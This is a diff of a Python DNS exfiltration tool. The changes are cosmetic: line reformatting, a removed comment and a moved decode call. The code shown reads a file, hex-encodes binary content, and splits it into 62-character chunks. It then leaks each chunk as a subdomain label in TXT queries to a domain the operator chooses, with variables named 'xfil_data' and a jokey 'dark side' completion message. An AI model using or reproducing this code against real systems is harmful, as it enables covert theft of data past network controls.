@@ -31,9 +31,11 @@ def is_ascii(fn):
 def make_query(wf,num):
 	characters = 62
 	for i in range (0, len(wf), characters):
-		#xfil_data =  (str(num).rjust(4,'0') + "-" + file_id + "-" + wf[i:i+characters])
 		xfil_data =  (wf[i:i+characters])
-		tld = ("%s.%s.%s.%s"%(str(hex(num)[2:]).rjust(4,'0'),xfil_data,file_id,args.domain))
+		tld = ("%s.%s.%s.%s"%(	str(hex(num)[2:]).rjust(4,'0'),
+					xfil_data,
+					file_id,
+					args.domain ))
 		print(tld)
 		try:
 			dns.resolver.query(tld,'TXT')
@@ -59,8 +61,9 @@ with open (args.file,"r") as work_file:
 	else:
 		work_file.close()
 		with open (args.file,'rb') as bin_file:
-			enc_bin_file = binascii.hexlify(bin_file.read()).decode()
-			make_query(enc_bin_file,num)
+			enc_bin_file = binascii.hexlify(bin_file.read())
+			make_query(enc_bin_file.decode(),num)
 
 print("Something, something...dark side. Something, Something...complete.\n")
+
 exit()
